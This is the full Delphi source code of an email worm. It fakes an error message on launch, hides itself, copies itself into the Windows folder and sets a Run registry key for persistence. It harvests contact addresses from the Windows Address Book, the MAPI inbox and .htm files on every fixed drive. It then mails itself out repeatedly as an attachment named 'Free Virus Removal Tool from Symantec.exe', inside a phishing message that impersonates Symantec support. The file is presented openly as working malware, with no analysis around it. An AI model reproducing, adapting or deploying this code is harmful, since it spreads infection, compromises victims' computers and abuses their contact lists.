   UNIT IWorm;

   INTERFACE

   USES
     Windows, SysUtils, Controls, Forms, Dialogs, MAPI, WinInet, Registry,
     AppEvnts, Psock, StdCtrls, Classes, ExtCtrls;

   TYPE
     TForm1 = CLASS(TForm)
       Timer1           : TTimer;
       PROCEDURE FormCreate(Sender: TObject);
       PROCEDURE Timer1Timer(Sender: TObject);
     PRIVATE
       { Private declarations }
     PUBLIC
       { Public declarations }
     END;

   VAR
     Form1                : TForm1;
     SentEmail            : Word;
     EmailNum             : Word;
     I,T                  : Longint;
     Emails               : ARRAY [1..3000] OF STRING;
     OSInfo               : TOSVersionInfoA;
     WABExists            : Boolean;
     Reg                  : TRegistry;
     S                    : STRING;
     FEmail               : ARRAY[1..60] OF STRING;
     FLineNumber          : Byte;
     FAttachmentName      : STRING;
     FFrom                : STRING;
     FFromName            : STRING;
     FSubject             : STRING;
     Error                : Byte;

   IMPLEMENTATION

   {$R *.DFM}

   FUNCTION CopyFile(CONST SourceFile:TFilename;CONST DestinationFile:TFilename):  Boolean;
   BEGIN
     RESULT := Windows.CopyFile(pChar(SourceFile),pChar(DestinationFile),False);
   END;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir: ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     Result:=StrPas(PWindowsDir)+'\';
   END;

   FUNCTION RegReadString(kroot:HKEY; sKey, sValue : STRING) : STRING;
   VAR
     qValue     : ARRAY [0..1023] OF Char;
     DataSize   : Integer;
     CurrentKey : HKEY;
   BEGIN
     RegOpenKeyEx(kRoot,PChar(sKey),0,KEY_ALL_ACCESS,CurrentKey);
     DataSize:=1024;
     RegQueryValueEx(CurrentKey,PChar(sValue),NIL,NIL,@qValue[0],@DataSize);
     RegCloseKey(CurrentKey);
     Result:=STRING(qvalue);
   END;

   PROCEDURE FakeEmails;
   BEGIN
     FEmail[01]:='Hi!';
     FEmail[02]:='';
     FEmail[03]:='I received infected emails from you!';
     FEmail[04]:='';
     FEmail[05]:='I attached a tool what able to remove the virus';
     FEmail[06]:='from your computer.';
     FEmail[07]:='';
     FEmail[08]:='----- Original Message -----';
     FEmail[09]:='From: Symantec Antivirus';
     FEmail[10]:='To: John';
     FEmail[11]:='Sent: Thursday, August 15, 2002 11:09 AM';
     FEmail[12]:='Subject: Free Virus Removal Tool from Symantec.exe';
     FEmail[13]:='';
     FEmail[14]:='>Dear Sir,';
     FEmail[15]:='>';
     FEmail[16]:='>Symantec Antivirus Lab released the new version of free Virus Removall Tool!!';
     FEmail[17]:='>';
     FEmail[18]:='>This tool able to remove the following dangerous viruses:';
     FEmail[19]:='>    -I-Worm.Klez,';
     FEmail[20]:='>    -I-Worm.Kiltro,';
     FEmail[21]:='>    -I-Worm.Langex,';
     FEmail[22]:='>    -I-Worm.Manymize,';
     FEmail[23]:='>    -I-Worm.Frethem,';
     FEmail[24]:='>    -I-Worm.Masana,';
     FEmail[25]:='>    -I-Worm.MyLife,';
     FEmail[26]:='>    -and other 50 dangerous viruses.';
     FEmail[27]:='>';
     FEmail[28]:='>Just start the attached file, and It will check your system.';
     FEmail[29]:='>';
     FEmail[30]:='>Best Regards,';
     FEmail[31]:='>  Symantec Antivirus Support';
     FEmail[32]:='>';
     FEmail[33]:='>------------------------------------------------------------';
     FEmail[34]:='>';
     FEmail[35]:='>';
     FEmail[36]:='>';
     FEmail[37]:='>';
     FEmail[38]:='>';
     FLineNumber:=38;
     FAttachmentName:='Free Virus Removal Tool from Symantec.exe';
     FSubject:='I received an email virus from you!!!';
   END;

   FUNCTION RegisterServiceProcess(dwProcessID,dwType:DWord) : DWord;
     STDCALL; EXTERNAL 'KERNEL32.DLL';

   PROCEDURE VRegistry;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True);
     IF Reg.ReadString('MAPI')='' THEN Reg.WriteString('MAPI',WinPath+'MAPI.exe');
     Reg.CloseKey;
   END;

   PROCEDURE QuickSort(Left,Right:Word);
      { Szokàsos quicksort rendezÂs   }
   VAR
     Up,Down : Word;
     Compare : STRING;
     Dummy   : STRING;
   BEGIN
     Up:=Left;Down:=Right;Compare:=Emails[(Left+Right)DIV 2];
     REPEAT
       WHILE Emails[Up]<Compare DO Inc(Up);
       WHILE Compare<Emails[Down] DO Dec(Down);
       IF Up<=Down THEN BEGIN
         Dummy:=Emails[Up];Emails[Up]:=Emails[Down];Emails[Down]:=Dummy;
         Inc(Up);Dec(Down);
       END;
     UNTIL Up>Down;
     IF Left<Down THEN QuickSort(Left,Down);
     IF Up<Right  THEN QuickSort(Up,Right);
   END;

   PROCEDURE KillDupes;
   VAR
     T,I : Longint;
   BEGIN
     FOR I:=EmailNum-1 DOWNTO 1 DO BEGIN
       IF emails[I]=Emails[I+1] THEN BEGIN
         FOR T:=I TO EmailNum DO Emails[T]:=Emails[T+1];
         Dec(EmailNum);
       END;
     END;
   END;

   PROCEDURE ReadWab;
   VAR
     WABFile : FILE;
     b,g     : Longint;
     i       : STRING;
     n       : ARRAY[1..5] OF Char;
     xx      : ARRAY[1..500] OF Char;
     rr      : Word;
     WABPath : STRING;
   BEGIN
     WABPath:=RegReadString(HKEY_CURRENT_USER,'SOFTWARE\Microsoft\WAB\WAB4\WAB File Name','');
     IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
       WABExists:=True;
       Assign(WABFile,WABPath);
       Reset(WABFile,1);
       Seek(WABFile,176199);
       REPEAT
         BlockRead(WABFile,n,5);
         IF n[1]+n[2]+n[3]+n[4]=Chr($01)+Chr($1F)+Chr($00)+Chr($03) THEN BEGIN
           BlockRead(WABFile,xx,Ord(n[5])+30);
           i:='';
           FOR rr:=1 TO Ord(n[5])+30 DO i:=i+xx[rr];
           Delete(i,1,3);
           g:=Pos(Chr(0)+Chr(0)+Chr(0),i);
           IF g>0 THEN Delete(i,g,Length(i)-g+1);
           FOR b:=1 TO Ord(n[5]) DO IF i[b]=Chr($00) THEN Delete(i,b,1);
           IF (Pos('@',i)>0)AND(i[1]<>'/') THEN BEGIN
             IF EmailNum<3000 THEN Inc(EmailNum);
             Emails[EmailNum]:=UpperCase(I);
           END;
         END ELSE Seek(WABFile,FilePos(WABFile)-4);
         UNTIL ((FileSize(WABFile)-FilePos(WABFile))<6);
         QuickSort(1,EmailNum);
         KillDupes;
       END;
       IF NOT FileExists(WABPath) THEN WABExists:=False;
     Close(WABFile);
     END;

   PROCEDURE WriteEmailsReg;
   VAR
     I : Longint;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\MAPI', True);
     FOR i:=1 TO EmailNum DO BEGIN
       str(i,s);
       Reg.WriteString(S,Emails[i]);
     END;
     Reg.WriteInteger('email_num',EmailNum);
     Reg.WriteInteger('Sent',SenteMail);
     Reg.CloseKey;
   END;

   PROCEDURE ReadEmailsReg;
   VAR
     I : Longint;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.OpenKey('\Software\MAPI', True) THEN BEGIN
       EmailNum:=Reg.ReadInteger('email_num');
       FOR i:=1 TO EmailNum DO BEGIN
         Str(i,s);
         Emails[i]:=Reg.ReadString(S);
       END;
     END;
     Reg.CloseKey;
   END;

   PROCEDURE SentEmailReg;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.KeyExists('\Software\MAPI') THEN BEGIN
     Reg.OpenKey('\Software\MAPI', True);
     SentEmail:=Reg.ReadInteger('Sent');
     END;
     Reg.CloseKey;
   END;

   FUNCTION FirstRun : Boolean;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Result:= NOT Reg.KeyExists('\Software\MAPI');
     Reg.CloseKey;
   END;

   PROCEDURE ReadInbox;
   VAR
     Recip                     : TMAPIRecipDesc;
     MAPIMessage               : TMAPIMessage;
     lppMapiMessage            : PMapiMessage;
     MError                    : Cardinal;
     MapiSession               : LongInt;
     bWinNT,bFindFirst         : Boolean;
     ProfileName               : STRING;
     sSeedMessageID,sMessageID : ARRAY[0..512] OF Char;
     I                         : Longint;
   BEGIN
     bWinNT:=(OSInfo.dwPlatformId=VER_PLATFORM_WIN32_NT);
     // Grab default profilename from registry
     IF (bWinNT) THEN ProfileName:=regReadString(HKEY_CURRENT_USER,'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles','DefaultProfile')
     ELSE ProfileName:=regReadString(HKEY_CURRENT_USER,'Software\Microsoft\Windows Messaging Subsystem\Profiles', 'DefaultProfile'); // Standard Windows
     TRY
       MError:=MapiLogOn(0, PChar(ProfileName), NIL, MAPI_NEW_SESSION, 0, @MapiSession);
       IF (MError<>SUCCESS_SUCCESS) THEN Exit;
     EXCEPT
       ;
     END;
     bFindFirst:=True;
     FOR i:=1 TO 50 DO TRY
       IF (bFindFirst) THEN bFindFirst := False ELSE sSeedMessageID := sMessageID;
       MError := MapiFindNext(MapiSession, 0, NIL, @sSeedMessageID, 0, 0, @sMessageID);
       IF (MError = SUCCESS_SUCCESS) THEN BEGIN
         lppMapiMessage := @MAPIMessage;
         MError := MAPIReadMail(MAPISession,0,@sMessageID, MAPI_ENVELOPE_ONLY, 0, lppMapiMessage);
         IF (MError = SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN WITH Recip DO BEGIN
           IF EmailNum<3000 THEN Inc(EmailNum);
           Emails[EmailNum]:=UpperCase(lppMapiMessage.lpOriginator.lpszAddress);
         END;
        END;
     EXCEPT
     END;
     QuickSort(1,EmailNum);
     KillDupes;
     WriteEmailsReg;
     TRY
       MError := MapiLogOff(MapiSession, 0, 0, 0);
     EXCEPT
       ;
     END;
   END;

   PROCEDURE MAPISendEmail;
   VAR
     MyMapiMessage : TMapiMessage;
     MyRecipients  : ARRAY OF TMapiRecipDesc;
     MyAttachments : ARRAY OF TMapiFileDesc;
     I             : Longint;
     MyFileName    : STRING;
     MyBody        : STRING;
     MySubject     : STRING;
   BEGIN
     FakeEmails;
     MySubject:=FSubject;
     FOR I:=1 TO FLineNumber DO MyBody:=MyBody+#10+#12+FEmail[i];
     IF SentEmail+5>EmailNum THEN SentEmail:=0;
     Inc(sentemail);
     {Recipient addresses}
     MyFileName:=WinPath+'Free Virus Removal Tool From Symantec.exe';
     SetLength(MyRecipients,5);
     FillChar(MyRecipients[0],Length(MyRecipients)*SizeOf(TMapiRecipDesc),0);
     WITH MyRecipients[0] DO BEGIN
       ulRecipClass:=MAPI_TO;
       lpszName:=PChar(Emails[SentEmail]);
       lpszAddress:=PChar(Emails[SentEmail]);
     END;
     FOR I:=1 TO 4 DO BEGIN
       Inc(SentEmail);
       WITH MyRecipients[I] DO BEGIN
         ulRecipClass:=MAPI_CC;
         lpszAddress:=PChar(Emails[SentEmail]);
       END;
     END;
     {Attach a file}
     IF FileExists(WinPath+'SysConfig\Free Virus Removal Tool From Symantec.exe') THEN BEGIN
       SetLength(MyAttachments,1);
       FillChar(MyAttachments[0],SizeOf(MyAttachments),0);
       MyAttachments[0].nPosition:=Cardinal(-1);
       MyAttachments[0].lpszPathName:=PChar(''+MyFileName);
     END;
     {Fill the message structure}
     FillChar(MyMapiMessage,SizeOf(TMapiMessage),0);
     WITH MyMapiMessage DO BEGIN
       lpszSubject:=PChar(MySubject);
       lpszNoteText:=PChar(MyBody);
       nRecipCount:=Length(MyRecipients);
       lpRecips:=@MyRecipients[0];
       IF Length(MyAttachments)>0 THEN BEGIN
         nFileCount:=Length(MyAttachments);
         lpFiles:=@MyAttachments[0];
       END;
     END;
     MapiSendMail(0,Application.Handle,MyMapiMessage,0,0);
   END;

   PROCEDURE TForm1.Timer1Timer(Sender: TObject);
   BEGIN
     IF {(InternetGetConnectedState(NIL,0))AND}(EmailNum>0) THEN BEGIN
       MAPISendEmail;
     END;
   END;

   PROCEDURE ClearEmail(S:String);
   VAR
     B : Word;
     LABEL TT;
   BEGIN
     FOR B:=Pos('@',S)+1 TO Length(S) DO BEGIN
       IF ((S[B]<'a')OR(S[B]>'z'))AND((S[B]<'0')OR(S[B]>'9'))AND((S[B]<'A')OR(S[B]>'Z'))AND(S[B]<>'.')AND(S[B]<>'-')AND(S[B]<>'_') THEN BEGIN
         Delete(S,B,Length(S));
         GOTO TT;
       END;
     END;
     TT:
     IF Pos('@',S)>0 THEN BEGIN
       Inc(EmailNum);
       Emails[EmailNum]:=S;
     END;
   END;

   PROCEDURE FindMail(EFile:AnsiString);
   VAR
     F   : Text;
     E,D : Word;
   BEGIN
     IF FileExists(EFile) THEN BEGIN
       Assign(F,EFile);
       Reset(F);
       REPEAT
         ReadLn(F,EFile);
         EFile:=UpperCase(EFile);
         E:=Pos('LTO:',EFile);
         IF E>0 THEN BEGIN
           Delete(EFile,1,E+3);
           D:=Pos('"',EFile);
           IF D>0 THEN Delete(EFile,D,Length(EFile));
           ClearEmail(EFile);
         END;
       UNTIL EOF(F);
       Close(F);
     END;
   END;

   PROCEDURE SearchDir(Path:AnsiString; fSpec:AnsiString);
   VAR
     F : TSearchRec;
   BEGIN
     Error:=Findfirst(Path+fSpec,faAnyFile,F);
     WHILE Error=0 DO BEGIN
       FindMail(Path+F.Name);
       Error:=FindNext(F);
     END;
   END;

   PROCEDURE SearchAllDirs(Path:AnsiString; fSpec : AnsiString);
   VAR
     D : TSearchRec;
   BEGIN
     SearchDir(Path,fSpec);
     Error:=FindFirst(Path+'*.*',faAnyFile,D);
     WHILE Error=0 DO BEGIN
       IF (d.Attr=faDirectory)AND(D.Name[1]<>'.') THEN SearchAllDirs(Path + D.Name + '\', fSpec);
       Error:=Findnext(d);
     END;
   END;

   PROCEDURE SearchAllDir;
   VAR
     I : Byte;
   BEGIN
     FOR I:=97 TO 122 DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchAllDirs(Chr(I)+':\','*.htm');
   END;

   PROCEDURE TForm1.FormCreate(Sender: TObject);
   BEGIN
     Reg := TRegistry.Create;
     IF FirstRun THEN Application.MessageBox('This File is Corrupted!','Error',MB_ICONHAND);
     OSInfo.dwOSVersionInfoSize:=sizeof(OSInfo);
     GetVersionEx(OSInfo);
     //Hiding the Application's TaskBar Button
     ShowWindow(Application.Handle, SW_HIDE);
     SetWindowLong(Application.Handle, GWL_EXSTYLE, GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW );
     ShowWindow(Application.Handle, SW_SHOW);
     //Hide from "Close Program" (Win 9x)
   //  if OSInfo.dwPlatformID=VER_PLATFORM_WIN32_WINDOWS THEN RegisterServiceProcess(GetCurrentProcessID, RSPSIMPLESERVICE);
     SentEmailReg;
     CopyFile (pchar(paramstr(0)),pchar(Winpath+'MAPI.exe'));
     CopyFile (pchar(paramstr(0)),pchar(Winpath+'Free Virus Removal Tool From Symantec.exe'));
     IF FirstRun THEN BEGIN
       Vregistry;
       EmailNum:=1; emails[1]:='MAIL@MICROSOFT.COM';
       SearchAllDir;
       ReadWab;
       ReadInBox;
     END ELSE BEGIN
       ReadEmailsReg;
       ReadInBox;
     END;
     Reg.Free;
   END;

   END.
